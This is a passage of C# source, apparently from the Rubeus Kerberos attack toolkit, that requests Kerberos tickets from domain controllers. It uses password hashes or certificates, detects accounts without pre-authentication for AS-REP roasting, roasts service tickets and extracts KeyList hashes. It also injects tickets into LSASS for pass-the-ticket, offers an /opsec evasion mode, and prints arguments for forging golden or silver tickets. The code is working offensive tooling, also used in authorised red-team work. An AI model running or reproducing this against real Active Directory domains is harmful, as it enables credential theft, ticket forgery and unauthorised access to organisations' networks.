using System;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Linq;
using Asn1;
using Rubeus.lib.Interop;
using Rubeus.Asn1;
using Rubeus.Kerberos;
using Rubeus.Kerberos.PAC;
using System.Collections.Generic;

namespace Rubeus {

    public class RubeusException : Exception
    {
        public RubeusException(string message)
            : base(message)
        {
        }
    }

    public class KerberosErrorException : RubeusException
    {
        public KRB_ERROR krbError;

        public KerberosErrorException(string message, KRB_ERROR krbError)
            : base(message)
        {
            this.krbError = krbError;
        }
    }

    public class Ask
    {
        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool opsec = false, string servicekey = "", bool changepw = false, bool pac = true, string proxyUrl = null, string service = null, Interop.KERB_ETYPE suppEtype = Interop.KERB_ETYPE.rc4_hmac, string principalType="principal")
        {
            // send request without Pre-Auth to emulate genuine traffic
            bool preauth = false;
            if (opsec)
            {
                try
                {
                    preauth = NoPreAuthTGT(userName, domain, keyString, etype, domainController, outfile, ptt, luid, describe, true, proxyUrl, service, suppEtype, opsec, principalType);
                }
                catch (KerberosErrorException) { }
            }

            try
            {
                // if AS-REQ without pre-auth worked don't bother sending AS-REQ with pre-auth
                if (!preauth)
                {
                    Console.WriteLine("[*] Using {0} hash: {1}", etype, keyString);               
                    Console.WriteLine("[*] Building AS-REQ (w/ preauth) for: '{0}\\{1}'", domain, userName);
                    AS_REQ userHashASREQ = AS_REQ.NewASReq(userName, domain, keyString, etype, opsec, changepw, pac, service, suppEtype, principalType);
                    return InnerTGT(userHashASREQ, etype, outfile, ptt, domainController, luid, describe, true, opsec, servicekey, false, proxyUrl);
                }
            }
            catch (KerberosErrorException ex)
            {
                KRB_ERROR error = ex.krbError;
                try
                {
                    Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}: {2}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code, error.e_text);
                }
                catch
                {
                    Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
                }
            }
            catch (RubeusException ex)
            {
                Console.WriteLine("\r\n" + ex.Message + "\r\n");
            }

            return null;
        }

        public static bool NoPreAuthTGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string domainController, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, string proxyUrl = null, string service = "", Interop.KERB_ETYPE suppEtype = Interop.KERB_ETYPE.rc4_hmac, bool opsec = true, string principalType="principal")
        {
            byte[] response = null;
            AS_REQ NoPreAuthASREQ = AS_REQ.NewASReq(userName, domain, suppEtype, opsec, service, principalType);
          
            byte[] reqBytes = NoPreAuthASREQ.Encode().Encode();

            if (String.IsNullOrEmpty(proxyUrl))
            {
                string dcIP = Networking.GetDCIP(domainController, verbose, domain);
                if (String.IsNullOrEmpty(dcIP)) { return false; }

                response = Networking.SendBytes(dcIP, 88, reqBytes);
            }
            else
            {
                KDC_PROXY_MESSAGE message = new KDC_PROXY_MESSAGE(reqBytes);
                message.target_domain = NoPreAuthASREQ.req_body.realm;
                response = Networking.MakeProxyRequest(proxyUrl, message);
            }

            if (response == null)
            {
                return false;
            }

            // decode the supplied bytes to an AsnElt object
            AsnElt responseAsn = AsnElt.Decode(response);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
            {
                if (verbose)
                    Console.WriteLine("[-] AS-REQ w/o preauth successful! {0} has pre-authentication disabled!", userName);

                if (!String.IsNullOrWhiteSpace(keyString))
                {
                    byte[] kirbiBytes = HandleASREP(responseAsn, etype, keyString, outfile, ptt, luid, describe, verbose);
                }

                return true;
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                if (error.error_code == (int)Interop.KERBEROS_ERROR.KDC_ERR_PREAUTH_REQUIRED)
                {
                    if (verbose)
                    {
                        Console.WriteLine("[!] Pre-Authentication required!");
                        foreach (PA_DATA pa_data in (List<PA_DATA>)error.e_data)
                        {
                            if (pa_data.type is Interop.PADATA_TYPE.ETYPE_INFO2)
                            {
                                if (((ETYPE_INFO2_ENTRY)pa_data.value).etype == (int)Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
                                {
                                    Console.WriteLine("[!]\tAES256 Salt: {0}", ((ETYPE_INFO2_ENTRY)pa_data.value).salt);
                                }
                                else if (((ETYPE_INFO2_ENTRY)pa_data.value).etype == (int)Interop.KERB_ETYPE.aes128_cts_hmac_sha1)
                                {
                                    Console.WriteLine("[!]\tAES128 Salt: {0}", ((ETYPE_INFO2_ENTRY)pa_data.value).salt);
                                }
                            }
                        }
                    }
                }
                else
                {
                    throw new KerberosErrorException("", error);
                }
            }
            return false;

        }

        //CCob (@_EthicalChaos_):
        // Based on KerberosAsymmetricCredential::Get function from Kerberos.NET from here:
        // https://github.com/dotnet/Kerberos.NET/blob/v4.5.0/Kerberos.NET/Credentials/KerberosAsymmetricCredential.cs
        // Additional functionality - If the certificate points to a file we assume PKCS12 certificate store 
        // with private key otherwise use users certificate store along with any smartcard that maybe present.
        public static X509Certificate2 FindCertificate(string certificate, string storePassword) {

            if (File.Exists(certificate)) {
                return new X509Certificate2(certificate, storePassword);
            } else {

                X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
                store.Open(OpenFlags.ReadOnly);
                X509Certificate2 result = null;

                foreach (var cert in store.Certificates) {
                    if (string.Equals(certificate, cert.Subject, StringComparison.InvariantCultureIgnoreCase)) {
                        result = cert;
                        break;
                    } else if (string.Equals(certificate, cert.Thumbprint, StringComparison.InvariantCultureIgnoreCase)) {
                        result = cert;
                        break;
                    }
                }

                if (result != null && !String.IsNullOrEmpty(storePassword)) {
                    result.SetPinForPrivateKey(storePassword);
                }

                return result;
            }
        }

        public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verifyCerts = false, string servicekey = "", bool getCredentials = false, string proxyUrl = null, string service = null, bool changepw = false, string principalType="principal") {
            try {
                X509Certificate2 cert = FindCertificate(certFile, certPass);

                // Check for Base64 encoded certificate second in case certFile was a hex-encoded fingerprint
                if (cert == null && Helpers.IsBase64String(certFile))
                {
                    cert = new X509Certificate2(Convert.FromBase64String(certFile), certPass);
                }

                if (cert == null) {
                    Console.WriteLine("[!] Failed to find certificate for {0}", certFile);
                    return null;
                }

                KDCKeyAgreement agreement = new KDCKeyAgreement();

                Console.WriteLine("[*] Using PKINIT with etype {0} and subject: {1} ", etype, cert.Subject);
                Console.WriteLine("[*] Building AS-REQ (w/ PKINIT preauth) for: '{0}\\{1}'", domain, userName);

                AS_REQ pkinitASREQ = AS_REQ.NewASReq(userName, domain, cert, agreement, etype, verifyCerts, service, changepw, principalType);
                return InnerTGT(pkinitASREQ, etype, outfile, ptt, domainController, luid, describe, true, false, servicekey, getCredentials, proxyUrl);

            } catch (KerberosErrorException ex) {
                KRB_ERROR error = ex.krbError;
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            } catch (RubeusException ex) {
                Console.WriteLine("\r\n" + ex.Message + "\r\n");
            }

            return null;
        }

        public static bool GetPKInitRequest(AS_REQ asReq, out PA_PK_AS_REQ pkAsReq) {

            if (asReq != null && asReq.padata != null) {
                foreach (PA_DATA paData in asReq.padata) {
                    if (paData.type == Interop.PADATA_TYPE.PK_AS_REQ) {
                        pkAsReq = (PA_PK_AS_REQ)paData.value;
                        return true;
                    }
                }
            }
            pkAsReq = null;
            return false;
        }

        public static int GetKeySize(Interop.KERB_ETYPE etype) {           
            switch (etype) {
                 case Interop.KERB_ETYPE.des_cbc_md5:
                    return 7;
                case Interop.KERB_ETYPE.rc4_hmac:
                    return 16;
                case Interop.KERB_ETYPE.aes128_cts_hmac_sha1:
                    return 16;
                case Interop.KERB_ETYPE.aes256_cts_hmac_sha1:
                    return 32;
                default:
                    throw new ArgumentException("Only /des, /rc4, /aes128, and /aes256 are supported at this time");
            }
        }

        public static byte[] InnerTGT(AS_REQ asReq, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false, bool opsec = false, string serviceKey = "", bool getCredentials = false, string proxyUrl = null)
        {
            if ((ulong)luid != 0) {
                Console.WriteLine("[*] Target LUID : {0}", (ulong)luid);
            }

            byte[] response = null;
            string dcIP = null;

            if (String.IsNullOrEmpty(proxyUrl))
            {
                dcIP = Networking.GetDCIP(domainController, false, asReq.req_body.realm);
                if (String.IsNullOrEmpty(dcIP))
                {
                    throw new RubeusException("[X] Unable to get domain controller address");
                }

                Console.WriteLine("[*] Using domain controller: {0}:88", dcIP);
                response = Networking.SendBytes(dcIP, 88, asReq.Encode().Encode());
            }
            else
            {
                Console.WriteLine("[*] Sending request via KDC proxy: {0}", proxyUrl);
                KDC_PROXY_MESSAGE message = new KDC_PROXY_MESSAGE(asReq.Encode().Encode());
                message.target_domain = asReq.req_body.realm;
                response = Networking.MakeProxyRequest(proxyUrl, message);
            }
            if (response == null)
            {
                throw new RubeusException("[X] No answer from domain controller");
            }

            // decode the supplied bytes to an AsnElt object
            AsnElt responseAsn;
            try
            {
                responseAsn = AsnElt.Decode(response);
            }
            catch(Exception e)
            {
               throw new Exception($"Error parsing response AS-REQ: {e}.  Base64 response: {Convert.ToBase64String(response)}");
            }

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
            {
                if (verbose)
                {
                    Console.WriteLine("[+] TGT request successful!");
                }

                byte[] kirbiBytes = HandleASREP(responseAsn, etype, asReq.keyString, outfile, ptt, luid, describe, verbose, asReq, serviceKey, getCredentials, dcIP);

                return kirbiBytes;
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                throw new KerberosErrorException("", error);
            }
            else
            {
                throw new RubeusException("[X] Unknown application tag: " + responseTag);
            }
        }

        public static void TGS(KRB_CRED kirbi, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false, string proxyUrl = null, bool keyList = false)
        {
            // kirbi            = the TGT .kirbi to use for ticket requests
            // service          = the SPN being requested
            // requestEType     = specific encryption type for the request, Interop.KERB_ETYPE.subkey_keymaterial implies default
            // ptt              = "pass-the-ticket" so apply the ticket to the current logon session
            // domainController = the specific domain controller to send the request, defaults to the system's DC
            // display          = true to display the ticket

            // extract out the info needed for the TGS-REQ request
            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
            string domain = kirbi.enc_part.ticket_info[0].prealm;
            Ticket ticket = kirbi.tickets[0];
            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;

            // the etype for the PA Data for the request, so needs to match the TGT key type
            Interop.KERB_ETYPE paEType = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;

            string[] services = service.Split(',');
            foreach (string sname in services)
            {
                // request the new service ticket
                TGS(userName, domain, ticket, clientKey, paEType, sname, requestEType, outfile, ptt, domainController, display, enterprise, roast, opsec, tgs, targetDomain, servicekey, asrepkey, u2u, targetUser, printargs, proxyUrl, keyList);
                Console.WriteLine();
            }
        }

        public static byte[] TGS(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE paEType, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false, string proxyUrl = null, bool keyList = false)
        {

            if (display)
            {
                if (requestEType == Interop.KERB_ETYPE.subkey_keymaterial)
                {
                    Console.WriteLine("[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket", requestEType);
                }
                else
                {
                    Console.WriteLine("[*] Requesting '{0}' etype for the service ticket", requestEType);
                }

                if (keyList)
                    Console.WriteLine("[*] Building KeyList TGS-REQ request for: '{0}'", userName);
                else if (!String.IsNullOrEmpty(service))
                    Console.WriteLine("[*] Building TGS-REQ request for: '{0}'", service);
                else if (u2u)
                    Console.WriteLine("[*] Building User-to-User TGS-REQ request for: '{0}'", userName);
                else
                    Console.WriteLine("[*] Building TGS-REQ request");

            }

            // if /service is empty get name from the supplied /tgs
            if (u2u && tgs != null && String.IsNullOrEmpty(service))
                service = tgs.enc_part.ticket_info[0].pname.name_string[0];

            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, clientKey, paEType, requestEType, false, targetUser, enterprise, roast, opsec, false, tgs, targetDomain, u2u, keyList);

            byte[] response = null;
            string dcIP = null;
            if (String.IsNullOrEmpty(proxyUrl))
            {
                dcIP = Networking.GetDCIP(domainController, display, domain);
                if (String.IsNullOrEmpty(dcIP)) { return null; }

                response = Networking.SendBytes(dcIP, 88, tgsBytes);
            }
            else
            {
                Console.WriteLine("[*] Sending request via KDC proxy: {0}", proxyUrl);
                KDC_PROXY_MESSAGE message = new KDC_PROXY_MESSAGE(tgsBytes);
                if (String.IsNullOrEmpty(targetDomain)) { targetDomain = domain; }
                message.target_domain = targetDomain;
                response = Networking.MakeProxyRequest(proxyUrl, message);
            }
            if (response == null)
            {
                return null;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
            {
                if (display)
                {
                    Console.WriteLine("[+] TGS request successful!");
                }

                // parse the response to an TGS-REP
                TGS_REP rep = new TGS_REP(responseAsn);

                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                byte[] outBytes = Crypto.KerberosDecrypt(paEType, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                AsnElt ae = AsnElt.Decode(outBytes, false);
                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);

                // extract hash for keylist - Need null for display options
                string keyListHash = null;
                if (keyList)
                {
                    keyListHash = Helpers.ByteArrayToString(encRepPart.encryptedPaData.PA_KEY_LIST_REP.encryptionKey.keyvalue);
                }
                

                // if using /opsec and the ticket is for a server configuration for unconstrained delegation, request a forwardable TGT
                if (opsec && (!roast) && ((encRepPart.flags & Interop.TicketFlags.ok_as_delegate) != 0))
                {
                    Console.WriteLine("[*] '/opsec' passed and service ticket has the 'ok-as-delegate' flag set, requesting a delegated TGT.");
                    byte[] tgtBytes = TGS_REQ.NewTGSReq(userName, domain, string.Format("krbtgt/{0}", domain), providedTicket, clientKey, paEType, requestEType, false, "", enterprise, roast, opsec, true);

                    if (String.IsNullOrEmpty(proxyUrl))
                    {
                        byte[] tgtResponse = Networking.SendBytes(dcIP, 88, tgtBytes);
                    }
                    else
                    {
                        KDC_PROXY_MESSAGE message = new KDC_PROXY_MESSAGE(tgtBytes);
                        message.target_domain = domain;
                        response = Networking.MakeProxyRequest(proxyUrl, message);
                    }
                }

                // now build the final KRB-CRED structure
                KRB_CRED cred = new KRB_CRED();

                // add the ticket
                cred.tickets.Add(rep.ticket);

                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                KrbCredInfo info = new KrbCredInfo();

                // [0] add in the session key
                info.key.keytype = encRepPart.key.keytype;
                info.key.keyvalue = encRepPart.key.keyvalue;

                // [1] prealm (domain)
                info.prealm = rep.crealm;

                // [2] pname (user)
                info.pname.name_type = rep.cname.name_type;
                info.pname.name_string = rep.cname.name_string;

                // [3] flags
                info.flags = encRepPart.flags;

                // [4] authtime (not required)

                // [5] starttime
                info.starttime = encRepPart.starttime;

                // [6] endtime
                info.endtime = encRepPart.endtime;

                // [7] renew-till
                info.renew_till = encRepPart.renew_till;

                // [8] srealm
                info.srealm = encRepPart.realm;

                // [9] sname
                info.sname.name_type = encRepPart.sname.name_type;
                info.sname.name_string = encRepPart.sname.name_string;

                // add the ticket_info into the cred object
                cred.enc_part.ticket_info.Add(info);

                byte[] kirbiBytes = cred.Encode().Encode();

                string kirbiString = Convert.ToBase64String(kirbiBytes);

                if (ptt)
                {
                    // pass-the-ticket -> import into LSASS
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }

                if (String.IsNullOrEmpty(servicekey) && u2u)
                    servicekey = Helpers.ByteArrayToString(clientKey);

                if (display)
                {
                    Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);

                    if (Rubeus.Program.wrapTickets)
                    {
                        // display the .kirbi base64, columns of 80 chararacters
                        foreach (string line in Helpers.Split(kirbiString, 80))
                        {
                            Console.WriteLine("      {0}", line);
                        }
                    }
                    else
                    {
                        Console.WriteLine("      {0}", kirbiString);
                    }

                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);

                    LSA.DisplayTicket(kirbi, 2, false, false, false, false, 
                        string.IsNullOrEmpty(servicekey) ? null : Helpers.StringToByteArray(servicekey), string.IsNullOrEmpty(asrepkey) ? null : Helpers.StringToByteArray(asrepkey),
                        null,null,null,string.IsNullOrEmpty(keyListHash) ? null : Helpers.StringToByteArray(keyListHash));
                }

                if (!String.IsNullOrEmpty(outfile))
                {
                    outfile = Helpers.MakeValidFileName(outfile);
                    if (Helpers.WriteBytesToFile(outfile, kirbiBytes))
                    {
                        if (display)
                        {
                            Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", outfile);
                        }
                    }
                }

                if (!String.IsNullOrEmpty(servicekey) && printargs)
                {
                    var decryptedEncTicket = cred.tickets[0].Decrypt(Helpers.StringToByteArray(servicekey), null);
                    PACTYPE pt = decryptedEncTicket.GetPac(null);
                    if (pt == null)
                    {
                        Console.WriteLine("[X] Unable to get the PAC");
                        return kirbiBytes;
                    }

                    string outArgs = String.Empty;

                    foreach (var pacInfoBuffer in pt.PacInfoBuffers)
                    {
                        if (pacInfoBuffer is LogonInfo li)
                        {
                            outArgs = String.Format("/user:{0} /id:{1} /pgid:{2} /logoncount:{3} /badpwdcount:{4} /sid:{5} /netbios:{6}", li.KerbValidationInfo.EffectiveName, li.KerbValidationInfo.UserId, li.KerbValidationInfo.PrimaryGroupId, li.KerbValidationInfo.LogonCount, li.KerbValidationInfo.BadPasswordCount, li.KerbValidationInfo.LogonDomainId.GetValue(), li.KerbValidationInfo.LogonDomainName);
                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.FullName.ToString()))
                                outArgs = String.Format("{0} /displayname:\"{1}\"", outArgs, li.KerbValidationInfo.FullName);
                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.LogonScript.ToString()))
                                outArgs = String.Format("{0} /scriptpath:\"{1}\"", outArgs, li.KerbValidationInfo.LogonScript);
                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.ProfilePath.ToString()))
                                outArgs = String.Format("{0} /profilepath:\"{1}\"", outArgs, li.KerbValidationInfo.ProfilePath);
                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.HomeDirectory.ToString()))
                                outArgs = String.Format("{0} /homedir:\"{1}\"", outArgs, li.KerbValidationInfo.HomeDirectory);
                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.HomeDirectoryDrive.ToString()))
                                outArgs = String.Format("{0} /homedrive:\"{1}\"", outArgs, li.KerbValidationInfo.HomeDirectoryDrive);
                            if (li.KerbValidationInfo.GroupCount > 0)
                                outArgs = String.Format("{0} /groups:{1}", outArgs, li.KerbValidationInfo.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
                            if (li.KerbValidationInfo.SidCount > 0)
                                outArgs = String.Format("{0} /sids:{1}", outArgs, li.KerbValidationInfo.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));
                            if (li.KerbValidationInfo.ResourceGroupCount > 0)
                                outArgs = String.Format("{0} /resourcegroupsid:{1} /resourcegroups:{2}", outArgs, li.KerbValidationInfo.ResourceGroupDomainSid.GetValue().ToString(), li.KerbValidationInfo.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
                            try
                            {
                                outArgs = String.Format("{0} /logofftime:\"{1}\"", outArgs, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.LogoffTime.LowDateTime | ((long)li.KerbValidationInfo.LogoffTime.HighDateTime << 32)).ToLocalTime());
                            }
                            catch { }
                            DateTime? passLastSet = null;
                            try
                            {
                                passLastSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordLastSet.LowDateTime | ((long)li.KerbValidationInfo.PasswordLastSet.HighDateTime << 32));
                            }
                            catch { }
                            if (passLastSet != null)
                            {
                                outArgs = String.Format("{0} /pwdlastset:\"{1}\"", outArgs, ((DateTime)passLastSet).ToLocalTime());
                                DateTime? passCanSet = null;
                                try
                                {
                                    passCanSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordCanChange.LowDateTime | ((long)li.KerbValidationInfo.PasswordCanChange.HighDateTime << 32));
                                }
                                catch { }
                                if (passCanSet != null)
                                    outArgs = String.Format("{0} /minpassage:{1}d", outArgs, (((DateTime)passCanSet) - ((DateTime)passLastSet)).Days);
                                DateTime? passMustSet = null;
                                try
                                {
                                    passCanSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordMustChange.LowDateTime | ((long)li.KerbValidationInfo.PasswordMustChange.HighDateTime << 32));
                                }
                                catch { }
                                if (passMustSet != null)
                                    outArgs = String.Format("{0} /maxpassage:{1}d", outArgs, (((DateTime)passMustSet) - ((DateTime)passLastSet)).Days);
                            }
                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.LogonServer.ToString()))
                                outArgs = String.Format("{0} /dc:{1}.{2}", outArgs, li.KerbValidationInfo.LogonServer.ToString(), cred.tickets[0].realm);
                            if ((Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl != Interop.PacUserAccountControl.NORMAL_ACCOUNT)
                                outArgs = String.Format("{0} /uac:{1}", outArgs, String.Format("{0}", (Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl).Replace(" ", ""));
                        }
                    }

                    Console.WriteLine("\r\n[*] Printing argument list for use with Rubeus' 'golden' or 'silver' commands:\r\n\r\n{0}\r\n", outArgs);
                }

                return kirbiBytes;
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }
            return null;
        }

        public static byte[] HandleASREP(AsnElt responseAsn, Interop.KERB_ETYPE etype, string keyString, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, AS_REQ asReq = null, string serviceKey = "", bool getCredentials = false, string dcIP = "")
        {
            // parse the response to an AS-REP
            AS_REP rep = new AS_REP(responseAsn);

            // convert the key string to bytes
            byte[] key;
            if (GetPKInitRequest(asReq, out PA_PK_AS_REQ pkAsReq)) {      
                // generate the decryption key using Diffie Hellman shared secret 
                PA_PK_AS_REP pkAsRep = (PA_PK_AS_REP)rep.padata[0].value;                    
                key = pkAsReq.Agreement.GenerateKey(pkAsRep.DHRepInfo.KDCDHKeyInfo.SubjectPublicKey.DepadLeft(), new byte[0], 
                    pkAsRep.DHRepInfo.ServerDHNonce, GetKeySize(etype));
            } else {
                // convert the key string to bytes
                key = Helpers.StringToByteArray(keyString);
            }

            if (rep.enc_part.etype != (int)etype)
            {
                // maybe this should be a fatal error instead of just a warning?
                Console.WriteLine($"[!] Warning: Supplied encyption key type is {etype} but AS-REP contains data encrypted with {(Interop.KERB_ETYPE)rep.enc_part.etype}");
            }

            // decrypt the enc_part containing the session key/etc.
            
            byte[] outBytes;

            if (etype == Interop.KERB_ETYPE.des_cbc_md5)
            {
                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else if (etype == Interop.KERB_ETYPE.rc4_hmac)
            {
                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else if (etype == Interop.KERB_ETYPE.aes128_cts_hmac_sha1)
            {
                // KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY = 3
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
            {
                // KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY = 3
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else
            {
                throw new RubeusException("[X] Encryption type \"" + etype + "\" not currently supported");
            }

            AsnElt ae = null;
            bool decodeSuccess = false;
            try
            {
                ae = AsnElt.Decode(outBytes, false);
                // Make sure the data has expected value so we know decryption was successful (from kerberos spec: EncASRepPart ::= [APPLICATION 25] )
                if (ae.TagValue == 25)
                {
                    decodeSuccess = true;
                } 
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Error parsing encrypted part of AS-REP: " + ex.Message);
            }

            if (decodeSuccess == false)
            {
                Console.WriteLine($"[X] Failed to decrypt TGT using supplied password/hash. If this TGT was requested with no preauth then the password supplied may be incorrect or the data was encrypted with a different type of encryption than expected");
                return null;
            }
           
            EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);

            // now build the final KRB-CRED structure
            KRB_CRED cred = new KRB_CRED();

            // add the ticket
            cred.tickets.Add(rep.ticket);

            // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

            KrbCredInfo info = new KrbCredInfo();

            // [0] add in the session key
            info.key.keytype = encRepPart.key.keytype;
            info.key.keyvalue = encRepPart.key.keyvalue;

            // [1] prealm (domain)
            info.prealm = encRepPart.realm;

            // [2] pname (user)
            info.pname.name_type = rep.cname.name_type;
            info.pname.name_string = rep.cname.name_string;

            // [3] flags
            info.flags = encRepPart.flags;

            // [4] authtime (not required)

            // [5] starttime
            info.starttime = encRepPart.starttime;

            // [6] endtime
            info.endtime = encRepPart.endtime;

            // [7] renew-till
            info.renew_till = encRepPart.renew_till;

            // [8] srealm
            info.srealm = encRepPart.realm;

            // [9] sname
            info.sname.name_type = encRepPart.sname.name_type;
            info.sname.name_string = encRepPart.sname.name_string;

            // add the ticket_info into the cred object
            cred.enc_part.ticket_info.Add(info);

            byte[] kirbiBytes = cred.Encode().Encode();

            if (verbose)
            {
                string kirbiString = Convert.ToBase64String(kirbiBytes);

                Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);

                if (Rubeus.Program.wrapTickets)
                {
                    // display the .kirbi base64, columns of 80 chararacters
                    foreach (string line in Helpers.Split(kirbiString, 80))
                    {
                        Console.WriteLine("      {0}", line);
                    }
                }
                else
                {
                    Console.WriteLine("      {0}", kirbiString);
                }
            }

            if (!String.IsNullOrEmpty(outfile))
            {
                outfile = Helpers.MakeValidFileName(outfile);
                if (Helpers.WriteBytesToFile(outfile, kirbiBytes))
                {
                    if (verbose)
                    {
                        Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", outfile);
                    }
                }
            }

            if (ptt || ((ulong)luid != 0))
            {
                // pass-the-ticket -> import into LSASS
                LSA.ImportTicket(kirbiBytes, luid);
            }

            if (describe)
            {
                KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                LSA.DisplayTicket(kirbi, 2, false, false, false, false, string.IsNullOrEmpty(serviceKey) ? null : Helpers.StringToByteArray(serviceKey), key);
            }

            if (getCredentials)
            {
                Console.WriteLine("[*] Getting credentials using U2U\r\n");
                byte[] u2uBytes = TGS_REQ.NewTGSReq(info.pname.name_string[0], info.prealm, info.pname.name_string[0], cred.tickets[0], info.key.keyvalue, (Interop.KERB_ETYPE)info.key.keytype, Interop.KERB_ETYPE.subkey_keymaterial, false, String.Empty, false, false, false, false, cred, "", true);
                byte[] u2uResponse = Networking.SendBytes(dcIP, 88, u2uBytes);
                if (u2uResponse == null)
                {
                    return null;
                }
                AsnElt u2uResponseAsn = AsnElt.Decode(u2uResponse);

                // check the response value
                int responseTag = u2uResponseAsn.TagValue;

                if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
                {
                    // parse the response to an TGS-REP and get the PAC
                    TGS_REP u2uRep = new TGS_REP(u2uResponseAsn);
                    EncTicketPart u2uEncTicketPart = u2uRep.ticket.Decrypt(info.key.keyvalue, key);
                    PACTYPE pt = u2uEncTicketPart.GetPac(key);

                    // look for the credential information and print
